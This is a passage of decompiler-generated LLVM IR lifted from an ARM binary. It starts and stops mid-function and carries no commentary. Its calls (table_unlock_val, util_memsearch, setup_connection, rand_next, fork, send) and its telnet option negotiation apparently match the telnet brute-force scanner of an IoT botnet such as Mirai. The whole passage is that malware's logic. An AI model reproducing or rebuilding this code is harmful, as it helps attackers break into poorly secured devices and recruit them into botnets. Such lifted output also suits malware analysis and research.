.thread111:                                       ; preds = %.thread110
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_10910, align 1
  %v0_10920.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10920.pr.pr, label %.thread114, label %.thread111.dec_label_pc_10924thread-pre-split_crit_edge

.thread111.dec_label_pc_10924thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_10924.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10924

dec_label_pc_10924:                               ; preds = %.thread110, %.thread111.dec_label_pc_10924thread-pre-split_crit_edge
  %v0_10924.pr = phi i32 [ %v0_10924.pr.pre, %.thread111.dec_label_pc_10924thread-pre-split_crit_edge ], [ %v4_10910, %.thread110 ]
  %v2_10924 = icmp ugt i32 %v0_10924.pr, 250
  store i1 %v2_10924, i1* %cpsr_c.global-to-local, align 1
  %v7_10924 = icmp eq i32 %v0_10924.pr, 251
  store i1 %v7_10924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10924, label %bb417, label %.thread114

bb417:                                            ; preds = %dec_label_pc_10924
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_1092c = load i32, i32* @r4, align 4
  %v4_1092c = add i32 %v3_1092c, 2
  %v5_1092c = inttoptr i32 %v4_1092c to i8*
  store i8 -3, i8* %v5_1092c, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_10924, %.thread111, %bb417
  %v0_10930 = load i32, i32* @r5, align 4
  %v1_10930 = add i32 %v0_10930, 4
  %v2_10930 = inttoptr i32 %v1_10930 to i32*
  %v3_10930 = load i32, i32* %v2_10930, align 4
  store i32 %v3_10930, i32* %r0.global-to-local, align 4
  %v0_10934 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1093c

dec_label_pc_1093c:                               ; preds = %dec_label_pc_10ac4, %.thread114
  %v0_10940 = phi i32 [ %v3_10adc, %dec_label_pc_10ac4 ], [ %v3_10930, %.thread114 ]
  %storemerge4 = phi i32 [ %v2_10988, %dec_label_pc_10ac4 ], [ %v0_10934, %.thread114 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_10ac4 ], [ 3, %.thread114 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10940 = call i32 @__libc_send(i32 %v0_10940, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_10940, i32* %r0.global-to-local, align 4
  %v0_10944 = load i32, i32* @r5, align 4
  %v1_10944 = add i32 %v0_10944, 24
  %v2_10944 = inttoptr i32 %v1_10944 to i32*
  %v3_10944 = load i32, i32* %v2_10944, align 4
  store i32 %v3_10944, i32* %r2.global-to-local, align 4
  %v0_10948 = load i32, i32* @r7, align 4
  %v1_10948 = add i32 %v0_10948, 3
  store i32 %v1_10948, i32* @r7, align 4
  %v3_1094c = icmp uge i32 %v1_10948, %v3_10944
  store i1 %v3_1094c, i1* %cpsr_c.global-to-local, align 1
  %v9_1094c = icmp eq i32 %v1_10948, %v3_10944
  store i1 %v9_1094c, i1* %cpsr_z.global-to-local, align 1
  %v0_10950 = load i32, i32* @r4, align 4
  %v1_10950 = add i32 %v0_10950, 3
  store i32 %v1_10950, i32* @r4, align 4
  %v5_10954 = icmp slt i32 %v1_10948, %v3_10944
  br i1 %v5_10954, label %dec_label_pc_108ac, label %dec_label_pc_10958

dec_label_pc_10958:                               ; preds = %dec_label_pc_108a4.loopexit, %dec_label_pc_108ac, %dec_label_pc_1093c, %dec_label_pc_108e4, %dec_label_pc_108b8, %dec_label_pc_10898, %dec_label_pc_10968.dec_label_pc_10958.loopexit_crit_edge
  %v6_10960 = phi i32 [ %v0_10994, %dec_label_pc_10968.dec_label_pc_10958.loopexit_crit_edge ], [ %v0_10080, %dec_label_pc_10898 ], [ %v6_10960240, %dec_label_pc_108ac ], [ %v0_10944, %dec_label_pc_1093c ], [ %v6_10960240, %dec_label_pc_108e4 ], [ %v6_10960240, %dec_label_pc_108b8 ], [ %v6_10960240, %dec_label_pc_108a4.loopexit ]
  %v0_10958 = phi i32 [ %v0_10958.pre.pre, %dec_label_pc_10968.dec_label_pc_10958.loopexit_crit_edge ], [ 0, %dec_label_pc_10898 ], [ %v1_108d4, %dec_label_pc_108ac ], [ %v1_10948, %dec_label_pc_1093c ], [ %v1_108d4, %dec_label_pc_108e4 ], [ %v1_108d4, %dec_label_pc_108b8 ], [ %v2_108d4, %dec_label_pc_108a4.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10958 = icmp eq i32 %v0_10958, 0
  store i1 %v2_10958, i1* %cpsr_z.global-to-local, align 1
  %tmp418 = icmp slt i32 %v0_10958, 1
  br i1 %tmp418, label %dec_label_pc_1088c, label %bb419

bb419:                                            ; preds = %dec_label_pc_10958
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_10960 = add i32 %v6_10960, 12
  %v8_10960 = inttoptr i32 %v7_10960 to i32*
  store i32 3, i32* %v8_10960, align 4
  br label %dec_label_pc_1088c

dec_label_pc_10968:                               ; preds = %dec_label_pc_108dc
  store i32 %v2_1096c, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1a8d6.265 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_1096c, i32* @r0, align 4
  %v0_1097c = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_10988, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a8cd.267 to i32), i32* @r1, align 4
  %v0_10990 = call i32 @memcpy()
  store i32 %v0_10990, i32* %r0.global-to-local, align 4
  %v0_10994 = load i32, i32* @r5, align 4
  %v1_10994 = add i32 %v0_10994, 24
  %v2_10994 = inttoptr i32 %v1_10994 to i32*
  %v3_10994 = load i32, i32* %v2_10994, align 4
  %v0_10998 = load i32, i32* @r4, align 4
  %v1_10998 = add i32 %v0_10998, 2
  store i32 %v1_10998, i32* %r2.global-to-local, align 4
  %v0_1099c = load i32, i32* @sl, align 4
  %v2_1099c = add i32 %v0_1099c, %v3_10994
  store i32 %v2_1099c, i32* @r3, align 4
  %v3_109a0 = icmp uge i32 %v2_1099c, %v1_10998
  store i1 %v3_109a0, i1* %cpsr_c.global-to-local, align 1
  %v9_109a0 = icmp eq i32 %v2_1099c, %v1_10998
  store i1 %v9_109a0, i1* %cpsr_z.global-to-local, align 1
  %v2_109a4 = xor i1 %v3_109a0, true
  %v3_109a4 = or i1 %v9_109a0, %v2_109a4
  br i1 %v3_109a4, label %dec_label_pc_10968.dec_label_pc_10958.loopexit_crit_edge, label %dec_label_pc_109a8

dec_label_pc_10968.dec_label_pc_10958.loopexit_crit_edge: ; preds = %dec_label_pc_10968
  %v0_10958.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10958

dec_label_pc_109a8:                               ; preds = %dec_label_pc_10968
  %v2_109a8 = inttoptr i32 %v1_10998 to i8*
  %v3_109a8 = load i8, i8* %v2_109a8, align 1
  %v4_109a8 = zext i8 %v3_109a8 to i32
  store i32 %v4_109a8, i32* %r3.global-to-local, align 4
  %v2_109ac = icmp ugt i8 %v3_109a8, 30
  store i1 %v2_109ac, i1* %cpsr_c.global-to-local, align 1
  %v7_109ac = icmp eq i8 %v3_109a8, 31
  store i1 %v7_109ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109ac, label %dec_label_pc_10ac4, label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_109a8
  %v1_109b4 = inttoptr i32 %v0_10998 to i8*
  %v2_109b4 = load i8, i8* %v1_109b4, align 1
  %v3_109b4 = zext i8 %v2_109b4 to i32
  store i32 %v3_109b4, i32* %r3.global-to-local, align 4
  %v2_109b8 = icmp ugt i8 %v2_109b4, -4
  store i1 %v2_109b8, i1* %cpsr_c.global-to-local, align 1
  %v7_109b8 = icmp eq i8 %v2_109b4, -3
  store i1 %v7_109b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109b8, label %.thread115, label %dec_label_pc_109c8

.thread115:                                       ; preds = %dec_label_pc_109b4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_109b4, align 1
  %v0_109c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_109c4.pr.pr, label %dec_label_pc_108f0, label %.thread115.dec_label_pc_109c8thread-pre-split_crit_edge

.thread115.dec_label_pc_109c8thread-pre-split_crit_edge: ; preds = %.thread115
  %v0_109c8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_109c8

dec_label_pc_109c8:                               ; preds = %dec_label_pc_109b4, %.thread115.dec_label_pc_109c8thread-pre-split_crit_edge
  %v0_109c8.pr = phi i32 [ %v0_109c8.pr.pre, %.thread115.dec_label_pc_109c8thread-pre-split_crit_edge ], [ %v3_109b4, %dec_label_pc_109b4 ]
  %v2_109c8 = icmp ugt i32 %v0_109c8.pr, 250
  store i1 %v2_109c8, i1* %cpsr_c.global-to-local, align 1
  %v7_109c8 = icmp eq i32 %v0_109c8.pr, 251
  store i1 %v7_109c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109c8, label %bb420, label %dec_label_pc_108f0

bb420:                                            ; preds = %dec_label_pc_109c8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_109d0 = load i32, i32* @r4, align 4
  %v4_109d0 = inttoptr i32 %v3_109d0 to i8*
  store i8 -3, i8* %v4_109d0, align 1
  br label %dec_label_pc_108f0

dec_label_pc_109d8:                               ; preds = %dec_label_pc_107e4, %dec_label_pc_107fc, %dec_label_pc_107f4, %bb414, %dec_label_pc_107d0, %dec_label_pc_107b4, %dec_label_pc_107c8, %bb413
  %v0_109d8 = phi i32 [ %v1_107a8, %dec_label_pc_107d0 ], [ %v1_107a8, %dec_label_pc_107b4 ], [ %v1_107a8, %dec_label_pc_107c8 ], [ %v1_107a8, %bb413 ], [ %v1_10808, %bb414 ], [ %v1_10808, %dec_label_pc_107f4 ], [ %v1_10808, %dec_label_pc_107fc ], [ %v1_10808, %dec_label_pc_107e4 ]
  %v1_109d8 = add i32 %v0_109d8, 1
  store i32 %v1_109d8, i32* @r7, align 4
  br label %dec_label_pc_10858

dec_label_pc_109e0:                               ; preds = %dec_label_pc_106f4, %dec_label_pc_10714, %dec_label_pc_1070c, %dec_label_pc_10704, %bb410, %dec_label_pc_106e0, %dec_label_pc_106bc, %dec_label_pc_106d8, %dec_label_pc_106d0, %bb409
  %v0_109e0 = phi i32 [ %v1_106b0, %dec_label_pc_106e0 ], [ %v1_106b0, %dec_label_pc_106bc ], [ %v1_106b0, %dec_label_pc_106d8 ], [ %v1_106b0, %dec_label_pc_106d0 ], [ %v1_106b0, %bb409 ], [ %v1_10720, %bb410 ], [ %v1_10720, %dec_label_pc_10704 ], [ %v1_10720, %dec_label_pc_1070c ], [ %v1_10720, %dec_label_pc_10714 ], [ %v1_10720, %dec_label_pc_106f4 ]
  %v1_109e0 = add i32 %v0_109e0, 1
  store i32 %v1_109e0, i32* @r7, align 4
  br label %dec_label_pc_109e4

dec_label_pc_109e4:                               ; preds = %dec_label_pc_10788.dec_label_pc_109e4_crit_edge, %dec_label_pc_109e0
  %v0_109e4 = phi i32 [ %v0_109e4.pre, %dec_label_pc_10788.dec_label_pc_109e4_crit_edge ], [ %v0_10080, %dec_label_pc_109e0 ]
  %v1_109e4 = inttoptr i32 %v0_109e4 to i32*
  %v2_109e4 = load i32, i32* %v1_109e4, align 4
  store i32 %v2_109e4, i32* %r3.global-to-local, align 4
  %v1_109e8 = add i32 %v0_109e4, 4
  %v2_109e8 = inttoptr i32 %v1_109e8 to i32*
  %v3_109e8 = load i32, i32* %v2_109e8, align 4
  store i32 %v3_109e8, i32* %r0.global-to-local, align 4
  %v1_109ec = add i32 %v2_109e4, 12
  %v2_109ec = inttoptr i32 %v1_109ec to i8*
  %v3_109ec = load i8, i8* %v2_109ec, align 1
  %v4_109ec = zext i8 %v3_109ec to i32
  store i32 %v4_109ec, i32* %r2.global-to-local, align 4
  %v1_109f0 = inttoptr i32 %v2_109e4 to i32*
  %v2_109f0 = load i32, i32* %v1_109f0, align 4
  store i32 %v2_109f0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_109f8 = call i32 @__libc_send(i32 %v3_109e8, i32 %v2_109f0, i32 %v4_109ec, i32 16384)
  store i32 %v4_109f8, i32* %r0.global-to-local, align 4
  %v0_109fc = load i32, i32* @r5, align 4
  %v1_109fc = add i32 %v0_109fc, 4
  %v2_109fc = inttoptr i32 %v1_109fc to i32*
  %v3_109fc = load i32, i32* %v2_109fc, align 4
  store i32 %v3_109fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10a0c = call i32 @__libc_send(i32 %v3_109fc, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10a14 = load i32, i32* @r5, align 4
  %v2_10a14 = add i32 %v1_10a14, 12
  %v3_10a14 = inttoptr i32 %v2_10a14 to i32*
  store i32 4, i32* %v3_10a14, align 4
  br label %dec_label_pc_1088c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10124
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_10a28 = call i32 @table_unlock_val(i32 29)
  store i32 %v2_10750, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_10a38 = call i32 @table_retrieve_val(i32 29, i32* nonnull %v2_10758)
  store i32 %v3_10a38, i32* %r0.global-to-local, align 4
  %v3_10a3c = load i8, i8* %stack_var_-56, align 1
  %v4_10a3c = sext i8 %v3_10a3c to i32
  store i32 %v3_10a38, i32* %r2.global-to-local, align 4
  %v1_10a44 = add nsw i32 %v4_10a3c, -1
  store i32 %v1_10a44, i32* %r3.global-to-local, align 4
  %v0_10a48 = load i32, i32* @r5, align 4
  %v1_10a48 = add i32 %v0_10a48, 24
  %v2_10a48 = inttoptr i32 %v1_10a48 to i32*
  %v3_10a48 = load i32, i32* %v2_10a48, align 4
  store i32 %v3_10a48, i32* %r1.global-to-local, align 4
  %v0_10a4c = load i32, i32* @sl, align 4
  store i32 %v0_10a4c, i32* %r0.global-to-local, align 4
  %v4_10a50 = call i32 @util_memsearch(i32 %v0_10a4c, i32 %v3_10a48, i32 %v3_10a38, i32 %v1_10a44)
  store i32 %v4_10a50, i32* @r7, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_10a5c = call i32 @table_lock_val(i32 29)
  store i32 %v1_10a5c, i32* %r0.global-to-local, align 4
  %v0_10a60 = load i32, i32* @r7, align 4
  %v2_10a60 = icmp eq i32 %v0_10a60, -1
  store i1 %v2_10a60, i1* %cpsr_c.global-to-local, align 1
  %v7_10a60 = icmp eq i32 %v0_10a60, -1
  store i1 %v7_10a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a60, label %dec_label_pc_10000.loopexit, label %dec_label_pc_10a68

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a68 = icmp eq i32 %v0_10a60, 0
  store i1 %v2_10a68, i1* %cpsr_z.global-to-local, align 1
  %tmp421 = icmp slt i32 %v0_10a60, 1
  br i1 %tmp421, label %dec_label_pc_1088c, label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a68
  %v0_10a70 = load i32, i32* @r5, align 4
  %v1_10a70 = add i32 %v0_10a70, 20
  %v2_10a70 = inttoptr i32 %v1_10a70 to i16*
  %v3_10a70 = load i16, i16* %v2_10a70, align 2
  %v4_10a70 = zext i16 %v3_10a70 to i32
  store i32 %v4_10a70, i32* %r3.global-to-local, align 4
  %v1_10a74 = add i32 %v0_10a70, 16
  %v2_10a74 = inttoptr i32 %v1_10a74 to i32*
  %v3_10a74 = load i32, i32* %v2_10a74, align 4
  store i32 %v3_10a74, i32* %r2.global-to-local, align 4
  store i32 %v2_10a78, i32* @lr, align 4
  store i32 %v4_10a70, i32* %stack_var_-42, align 4
  store i32 %v3_10a74, i32* %stack_var_-60, align 4
  %v1_10a84 = inttoptr i32 %v0_10a70 to i32*
  %v2_10a84 = load i32, i32* %v1_10a84, align 4
  store i32 %v2_10a84, i32* @r8, align 4
  %v0_10a88 = call i32 @__libc_fork()
  store i32 %v0_10a88, i32* %r0.global-to-local, align 4
  %v7_10a8c = icmp eq i32 %v0_10a88, -1
  %.432 = zext i1 %v7_10a8c to i32
  store i32 %.432, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a98 = icmp eq i32 %v0_10a88, 0
  store i1 %v2_10a98, i1* %cpsr_z.global-to-local, align 1
  %tmp424 = icmp slt i32 %v0_10a88, 1
  br i1 %tmp424, label %bb425, label %.thread121

.thread121:                                       ; preds = %dec_label_pc_10a70
  store i32 1, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10aac

bb425:                                            ; preds = %dec_label_pc_10a70
  store i32 %.432, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10aa4 = icmp eq i1 %v7_10a8c, false
  store i1 %v2_10aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10aa4, label %dec_label_pc_10c58, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %.thread121, %bb425
  %v0_10aac = load i32, i32* @r5, align 4
  %v1_10aac = add i32 %v0_10aac, 4
  %v2_10aac = inttoptr i32 %v1_10aac to i32*
  %v3_10aac = load i32, i32* %v2_10aac, align 4
  store i32 %v3_10aac, i32* %r0.global-to-local, align 4
  %v1_10ab0 = call i32 @__GI___libc_close(i32 %v3_10aac)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10ab8 = load i32, i32* @r4, align 4
  %v1_10ab8 = load i32, i32* @r5, align 4
  %v2_10ab8 = add i32 %v1_10ab8, 4
  %v3_10ab8 = inttoptr i32 %v2_10ab8 to i32*
  store i32 %v0_10ab8, i32* %v3_10ab8, align 4
  %v0_10abc = load i32, i32* %r0.global-to-local, align 4
  %v1_10abc = load i32, i32* @r5, align 4
  %v2_10abc = add i32 %v1_10abc, 12
  %v3_10abc = inttoptr i32 %v2_10abc to i32*
  store i32 %v0_10abc, i32* %v3_10abc, align 4
  br label %dec_label_pc_1088c

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_109a8
  store i32 %v2_1096c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_10ad0 = add i32 %v0_10994, 4
  %v2_10ad0 = inttoptr i32 %v1_10ad0 to i32*
  %v3_10ad0 = load i32, i32* %v2_10ad0, align 4
  store i32 %v3_10ad0, i32* %r0.global-to-local, align 4
  %v4_10ad4 = call i32 @__libc_send(i32 %v3_10ad0, i32 %v2_1096c, i32 3, i32 16384)
  store i32 %v4_10ad4, i32* %r0.global-to-local, align 4
  store i32 %v2_10980, i32* %r1.global-to-local, align 4
  %v0_10adc = load i32, i32* @r5, align 4
  %v1_10adc = add i32 %v0_10adc, 4
  %v2_10adc = inttoptr i32 %v1_10adc to i32*
  %v3_10adc = load i32, i32* %v2_10adc, align 4
  store i32 %v3_10adc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1093c

dec_label_pc_10aec:                               ; preds = %dec_label_pc_1000c
  store i32 %.pre, i32* @r0, align 4
  %v1_10af4 = add i32 %v0_10aec, 92
  store i32 %v1_10af4, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_10afc = call i32 @memmove(i32 %.pre, i32 %v1_10af4, i32 192)
  store i32 %v3_10afc, i32* %r0.global-to-local, align 4
  %v0_10b00 = load i32, i32* @r5, align 4
  %v1_10b00 = add i32 %v0_10b00, 24
  %v2_10b00 = inttoptr i32 %v1_10b00 to i32*
  %v3_10b00 = load i32, i32* %v2_10b00, align 4
  %v1_10b04 = add i32 %v3_10b00, -64
  store i32 %v1_10b04, i32* %r3.global-to-local, align 4
  store i32 %v1_10b04, i32* %v2_10b00, align 4
  br label %dec_label_pc_1001c

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10160
  %v0_10b10 = load i32, i32* @r5, align 4
  store i32 %v0_10b10, i32* @r0, align 4
  %v0_10b14 = call i32 @setup_connection()
  store i32 %v0_10b14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1019c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10728
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10b1c = load i8, i8* %stack_var_-56, align 1
  %v4_10b1c = sext i8 %v3_10b1c to i32
  %v0_10b20 = load i32, i32* @r6, align 4
  store i32 %v0_10b20, i32* %r2.global-to-local, align 4
  %v1_10b24 = add nsw i32 %v4_10b1c, -1
  store i32 %v1_10b24, i32* %r3.global-to-local, align 4
  %v0_10b28 = load i32, i32* @sl, align 4
  store i32 %v0_10b28, i32* %r0.global-to-local, align 4
  %v0_10b2c = load i32, i32* @r5, align 4
  %v1_10b2c = add i32 %v0_10b2c, 24
  %v2_10b2c = inttoptr i32 %v1_10b2c to i32*
  %v3_10b2c = load i32, i32* %v2_10b2c, align 4
  store i32 %v3_10b2c, i32* %r1.global-to-local, align 4
  %v4_10b30 = call i32 @util_memsearch(i32 %v0_10b28, i32 %v3_10b2c, i32 %v0_10b20, i32 %v1_10b24)
  store i32 %v4_10b30, i32* %r0.global-to-local, align 4
  %v1_10b34 = add i32 %v4_10b30, 1
  store i32 %v1_10b34, i32* @r7, align 4
  %v2_10b34 = icmp eq i32 %v4_10b30, -1
  store i1 %v2_10b34, i1* %cpsr_c.global-to-local, align 1
  %v7_10b34 = icmp eq i32 %v1_10b34, 0
  store i1 %v7_10b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b34, label %dec_label_pc_10b44, label %dec_label_pc_10788

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10b1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_10b48 = call i32 @table_lock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_10b50 = call i32 @table_lock_val(i32 33)
  store i32 %v1_10b50, i32* %r0.global-to-local, align 4
  %v0_10b54 = load i32, i32* @r5, align 4
  %v1_10b54 = add i32 %v0_10b54, 12
  %v2_10b54 = inttoptr i32 %v1_10b54 to i32*
  %v3_10b54 = load i32, i32* %v2_10b54, align 4
  store i32 %v3_10b54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10004.backedge

dec_label_pc_10004.backedge.thread:               ; preds = %dec_label_pc_101c8, %dec_label_pc_1029c, %dec_label_pc_10370, %dec_label_pc_10444, %dec_label_pc_10518
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1000c

dec_label_pc_10004.backedge.thread528:            ; preds = %dec_label_pc_1063c, %dec_label_pc_103d4, %dec_label_pc_10300, %dec_label_pc_104a8, %dec_label_pc_1022c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1000c

dec_label_pc_10004.backedge:                      ; preds = %dec_label_pc_10080, %dec_label_pc_10b44, %dec_label_pc_10c48
  %v0_1000c186 = phi i32 [ %v0_10c50, %dec_label_pc_10c48 ], [ %v0_10b54, %dec_label_pc_10b44 ], [ %v0_10080, %dec_label_pc_10080 ]
  %v0_10004.be = phi i32 [ %v3_10c50, %dec_label_pc_10c48 ], [ %v3_10b54, %dec_label_pc_10b44 ], [ %v3_10080, %dec_label_pc_10080 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10004 = icmp eq i32 %v0_10004.be, 0
  store i1 %v2_10004, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10004, label %dec_label_pc_1010c, label %dec_label_pc_1000c

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_ffbc
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_10750, i32* %r3.global-to-local, align 4
  store i32 %v2_1073c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  store i32 4, i32* %stack_var_-60, align 4
  %v5_10b88 = call i32 @getsockopt(i32 %v3_ffb0, i32 1, i32 4, i32 %v2_10750, i32 %v2_1073c)
  %v3_10b8c = load i8, i8* %stack_var_-56, align 1
  %v4_10b8c = sext i8 %v3_10b8c to i32
  store i32 %v4_10b8c, i32* %r3.global-to-local, align 4
  %v2_10b90 = or i32 %v4_10b8c, %v5_10b88
  store i32 %v2_10b90, i32* %r0.global-to-local, align 4
  %v4_10b90 = icmp eq i32 %v2_10b90, 0
  store i1 %v4_10b90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_10b90, label %dec_label_pc_10b98, label %dec_label_pc_10c2c

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b5c
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10b9c = load i32, i32* @r5, align 4
  %v2_10b9c = add i32 %v1_10b9c, 12
  %v3_10b9c = inttoptr i32 %v2_10b9c to i32*
  store i32 2, i32* %v3_10b9c, align 4
  %v0_10ba0 = call i32 @rand_next()
  %v2_10ba8 = load i16, i16* bitcast (i16** @global_var_235ec.171 to i16*), align 4
  %v3_10ba8 = zext i16 %v2_10ba8 to i32
  %v2_10bac = udiv i32 %v0_10ba0, %v3_10ba8
  %v3_10bac = urem i32 %v0_10ba0, %v3_10ba8
  store i32 %v2_10bac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_235bc.167 to i32), i32* %r3.global-to-local, align 4
  %v2_10bb4 = load i32, i32* @global_var_235bc.167, align 4
  store i32 %v2_10bb4, i32* %ip.global-to-local, align 4
  %v1_10bbc = load i32, i32* @r4, align 4
  %v9_10bbc = icmp eq i32 %v2_10bb4, %v1_10bbc
  store i1 %v9_10bbc, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_10bac, i32* %r1.global-to-local, align 4
  %v7_10bc4 = icmp sgt i32 %v2_10bb4, %v1_10bbc
  br i1 %v7_10bc4, label %dec_label_pc_10bc8, label %dec_label_pc_10c08

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10b98
  %v2_10bcc = load i32, i32* @global_var_235e8.169, align 4
  store i32 %v2_10bcc, i32* %r3.global-to-local, align 4
  store i32 %v1_10bbc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10be8

dec_label_pc_10bd8:                               ; preds = %dec_label_pc_10bf8, %dec_label_pc_10be8
  %v1_10bd8 = add i32 %v0_10bd8, 1
  store i32 %v1_10bd8, i32* %r2.global-to-local, align 4
  %v9_10bdc = icmp eq i32 %v1_10bd8, %v2_10bb4
  %v1_10be0 = add i32 %v0_10be0, 16
  store i32 %v1_10be0, i32* %r3.global-to-local, align 4
  br i1 %v9_10bdc, label %dec_label_pc_10c08.loopexit, label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10bd8, %dec_label_pc_10bc8
  %v0_10bd8 = phi i32 [ %v1_10bd8, %dec_label_pc_10bd8 ], [ %v1_10bbc, %dec_label_pc_10bc8 ]
  %v0_10be0 = phi i32 [ %v1_10be0, %dec_label_pc_10bd8 ], [ %v2_10bcc, %dec_label_pc_10bc8 ]
  store i32 %v0_10be0, i32* %r0.global-to-local, align 4
  %v1_10bec = add i32 %v0_10be0, 8
  %v2_10bec = inttoptr i32 %v1_10bec to i16*
  %v3_10bec = load i16, i16* %v2_10bec, align 2
  %v4_10bec = zext i16 %v3_10bec to i32
  store i32 %v4_10bec, i32* %r3.global-to-local, align 4
  %tmp426 = icmp ugt i32 %v4_10bec, %v3_10bac
  br i1 %tmp426, label %dec_label_pc_10bd8, label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10be8
  %v1_10bf8 = add i32 %v0_10be0, 10
  %v2_10bf8 = inttoptr i32 %v1_10bf8 to i16*
  %v3_10bf8 = load i16, i16* %v2_10bf8, align 2
  %v4_10bf8 = zext i16 %v3_10bf8 to i32
  store i32 %v4_10bf8, i32* %r3.global-to-local, align 4
  %v3_10bfc = icmp uge i32 %v4_10bf8, %v3_10bac
  %v9_10bfc = icmp eq i32 %v4_10bf8, %v3_10bac
  %v2_10c00 = xor i1 %v3_10bfc, true
  %v3_10c00 = or i1 %v9_10bfc, %v2_10c00
  br i1 %v3_10c00, label %dec_label_pc_10bd8, label %dec_label_pc_10c0c.loopexit

dec_label_pc_10c08.loopexit:                      ; preds = %dec_label_pc_10bd8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c08

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10c08.loopexit, %dec_label_pc_10b98
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c0c

dec_label_pc_10c0c.loopexit:                      ; preds = %dec_label_pc_10bf8
